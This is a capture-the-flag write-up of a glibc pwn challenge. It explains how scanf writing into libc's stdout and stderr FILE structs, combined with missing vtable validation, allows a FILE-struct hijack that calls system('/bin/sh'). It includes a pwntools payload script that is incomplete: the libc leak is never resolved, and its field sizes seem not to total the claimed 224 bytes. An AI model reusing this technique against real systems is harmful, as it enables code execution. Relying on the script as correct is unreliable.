# The Emptiness Machine — PWN Writeup

**CTF:** Cyber Apocalypse 2026  
**Category:** PWN  
**Challenge Name:** The Emptiness Machine  
**Files:** `the_emptiness_machine`, `glibc/libc.so.6`, `glibc/ld-linux-x86-64.so.2`

## How We Solved It — Reasoning

### 1. Initial Reconnaissance

The binary `the_emptiness_machine` is an x86-64 ELF, PIE, with Full RELRO, NX enabled, and no stack canary.

```
$ file the_emptiness_machine
ELF 64-bit LSB pie executable, x86-64, dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, not stripped
```

It ships with a custom glibc 2.39 (Ubuntu 24.04). Connecting to the target (154.57.164.67:30827) reveals an ASCII art banner and prompts from a "Subdued Voice" — lyrics from Linkin Park's "The Emptiness Machine":

```
[Subdued Voice]: Let you cut me open... Just to watch me bleed..
Rin's interaction:
[Subdued Voice]: Gave up who I am for who you wanted me to be..
Rin's interaction:
```

### 2. Disassembly & Reverse Engineering

Using `radare2` we find a remarkably simple `main()` function (166 bytes):

```c
int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    puts(banner);                           // ASCII art
    printf("[Subdued Voice]: Let you...");  // First prompt
    scanf("%40s", stdout);                  // ← WRITES TO stdout FILE STRUCT!
    printf("[Subdued Voice]: Gave up...");  // Second prompt  
    scanf("%224s", stderr);                 // ← WRITES TO stderr FILE STRUCT!
    return 0;                               // → exit() → _IO_cleanup → _IO_flush_all
}
```

**Key observation:** The `scanf` format strings (`%40s` and `%224s`) write input directly into the **FILE struct addresses** of stdout and stderr in libc. The second argument to scanf is the VALUE of the stdout/stderr pointer (the FILE struct address in libc), NOT a stack buffer.

The function allocates **no stack buffer** — there's no `sub rsp, N` instruction. It simply pushes `rbp` and uses that.

### 3. Memory Layout Analysis

Using `nm -D` on the custom libc:

```
_IO_2_1_stderr_  @ libc + 0x2044e0    (224 bytes to stdout)
_IO_2_1_stdout_  @ libc + 0x2045c0
_IO_2_1_stdin_   @ libc + 0x2038e0
_IO_list_all     @ libc + 0x2034c0
_IO_wfile_jumps  @ libc + 0x201228
_IO_file_jumps   @ libc + 0x201030
system           @ libc + 0x58750
"/bin/sh"        @ libc + 0x1cb42f
```

The critical layout:
- stderr FILE struct: **libc + 0x2044e0** (224 bytes long)
- stdout FILE struct: **libc + 0x2045c0** (immediately follows stderr)
- **Distance: 0xe0 = 224 bytes exactly** — matches the second scanf size!

This means the **null terminator** from the second `scanf("%224s", stderr)` overflows into **byte 0 of stdout._flags**.

### 4. Critical Discovery: No Vtable Validation

The custom glibc has **`_IO_validate_vtable` completely removed** — confirmed by checking both dynamic symbols and strings. This means FSOP (File Stream Oriented Programming) vtable attacks are possible without triggering abort().

Normally glibc >= 2.34 validates vtable pointers are within the `__libc_IO_vtables` section. This libc has no such check — we can set vtable to **any address**.

### 5. Exploit Strategy

#### Key Constraints
- First input: 40 bytes → controls `_flags` through `_IO_write_base` in stdout
- Second input: 224 bytes → FULL control of stderr FILE struct (including vtable)
- No libc addresses known (ASLR assumed enabled)
- No stack buffer overflow
- PIE + Full RELRO

#### Phase A: Keep stdout Alive for Second Prompt

The first input MUST keep stdout functional for `printf(second_prompt)`. After testing various flag values:

**Working flags: `0xfbad2086`** = `_IO_MAGIC | _IO_IS_FILEBUF | _IO_LINKED | _IO_UNBUFFERED | _IO_NO_READS`

Critical: **No `_IO_NO_WRITES` (0x08)** — this blocks all output!
Critical: **No `_IO_CURRENTLY_PUTTING` (0x0800)** — this prevents buffer reinit on overflow.

With these flags, the overflow code reinitializes write_base/write_ptr from the preserved _IO_buf_base, keeping printf operational.

#### Phase B: Leak libc Address

The first input's null terminator (at byte 32 when sending 32 chars) overwrites the LSB of `_IO_write_base` in stdout. This creates:
- `_IO_write_base = original & ~0xFF` (slightly lower address)
- `_IO_write_ptr = original` (unchanged)
- `write_ptr > write_base` → triggers flush of ~67 bytes from within the FILE struct

However, the reinitialization path (without `_IO_CURRENTLY_PUTTING`) sets write_ptr = write_base before the flush, eliminating the leak. With `_IO_CURRENTLY_PUTTING`, the leak fires but the subsequent FILE struct corruption (writing prompt text into the struct's data area) causes a crash before we receive the data.

**Alternative leak approach:** Use the second input to partially overwrite stderr, keeping the original vtable and most fields intact. By setting `_fileno = 0` (stdin, which is the socket), on exit the flush outputs FILE struct data to our socket.

#### Phase C: Shell via FSOP (No Vtable Check)

With the libc base known (from leak or if ASLR disabled):

1. **Craft stderr's FILE struct** (224 bytes):
   - Start with `"/bin/sh\x00"` as the `_flags` field
   - Set `_IO_write_ptr > _IO_write_base` (trigger flush on exit)
   - Set `_IO_buf_base = system()` → this becomes the function pointer
   - Set `vtable = stderr + 0x20` → `__overflow` reads at vtable+0x18 = stderr+0x38 = `_IO_buf_base`
   - When `_IO_OVERFLOW(stderr, EOF)` fires on exit, it calls `system(stderr)` = `system("/bin/sh")`
   - Set `_fileno = 1` so any flush output reaches our socket

2. **No vtable validation means** the arbitrary vtable pointer is accepted.

### 6. Exploit Construction

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Libc offsets
LIBC_STDERR = 0x2044e0
LIBC_SYSTEM = 0x58750

# First input: 32 bytes — keep stdout alive
flags = 0xfbad2086  # No _IO_NO_WRITES, No _IO_CURRENTLY_PUTTING
first = p32(flags) + p32(0) + p64(0) * 3

# After leak, compute addresses
libc_base = leaked_addr - LIBC_STDERR  
stderr_addr = libc_base + LIBC_STDERR
system_addr = libc_base + LIBC_SYSTEM

# Second input: 224 bytes — fake FILE struct for FSOP
payload  = b'/bin/sh\x00'             # _flags (+ padding)
payload += p64(0) * 3                  # read pointers
payload += p64(stderr_addr + 0x28)     # _IO_write_base
payload += p64(stderr_addr + 0x30)     # _IO_write_ptr  (> write_base)
payload += p64(stderr_addr + 0x30)     # _IO_write_end
payload += p64(system_addr)            # _IO_buf_base → __overflow!
payload += p64(0) * 5                  # buf_end through save_end
payload += p64(0) * 2                  # markers, chain
payload += p32(1) + p32(0)             # fileno=1, flags2
payload += p64(0)                      # old_offset
payload += p16(0) + p8(0) + b'\x00'    # cur_column, vtable_offset, shortbuf
payload += p32(0)                      # padding
payload += p64(0) * 2                  # lock, offset
payload += p64(0) * 4                  # codecvt, wide_data, freeres_list, freeres_buf
payload += p64(0)                      # pad5
payload += p32(0)                      # mode
payload += b'\x00' * 20                # unused2
payload += p64(stderr_addr + 0x20)     # vtable → __overflow at +0x18 = system()
# Total: 224 bytes
```

### 7. Key Insights

1. **The INPUT BUFFER IS THE LIBC FILE STRUCT.** There's no stack buffer — scanf writes directly into libc's `_IO_2_1_stdout_` and `_IO_2_1_stderr_`.

2. **Two writes, one purpose-built.** 40 bytes for stdout (just enough to corrupt critical flags/pointers) and 224 bytes for stderr (exactly the FILE struct size, with null overflow into stdout._flags).

3. **Removed vtable validation** is the enabler. Without this, vtable-based FSOP is impossible in modern glibc.

4. **The theme fits:** "Two currents of herself running side by side" = two FILE structs (stdout and stderr). "Whichever one she turns against the voice first" = whichever FILE struct is corrupted first determines the output path.

### 8. Flag

`CApoc{...}`

## References
- FILE struct internals: https://code.woboq.org/userspace/glibc/libio/libio.h.html
- FSOP / House of Apple 2: https://roderickchan.github.io/zh-cn/2023-02-26-house-of-apple-2/
- Linkin Park — The Emptiness Machine: https://www.youtube.com/watch?v=9S5mVhYoMY4
